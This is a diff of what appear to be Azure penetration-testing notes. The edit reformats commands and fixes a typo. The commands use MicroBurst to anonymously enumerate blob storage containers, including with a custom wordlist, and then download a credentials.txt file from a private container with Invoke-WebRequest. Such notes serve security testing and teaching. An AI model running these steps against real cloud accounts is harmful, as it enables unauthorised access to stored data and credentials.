@@ -28,12 +28,12 @@ create a vulnerability.
 
 #### Misconfigured blob containers:
 
- - Import-Module MicroBurst.psm1
+    Import-Module MicroBurst.psm1
 
- - Invoke-EnumerateAzureBlobs -Base BASE_NAME (Anonymously enumerate storage account containers)
+    Invoke-EnumerateAzureBlobs -Base BASE_NAME (Anonymously enumerate storage account containers)
 
- - Invoke-WebRequest -Uri "https://azurepentesting.blob.core.windows.net/private/credentials.txt" -OutFile "credentials.txt" (Extract enumerated container found with MicroBurst)
+    Invoke-WebRequest -Uri "https://azurepentesting.blob.core.windows.net/private/credentials.txt" -OutFile "credentials.txt" (Extract enumerated container found with MicroBurst)
 
 ## To use custom permutation wordlist we use the command:
 
- - Invoke-EnumerateAzurebLOBS -Base BASE_NAME -Folders .\CUSTOM_CONTAINER_WORDLIST.TXT
+    Invoke-EnumerateAzureBlobs -Base BASE_NAME -Folders .\CUSTOM_CONTAINER_WORDLIST.TXT
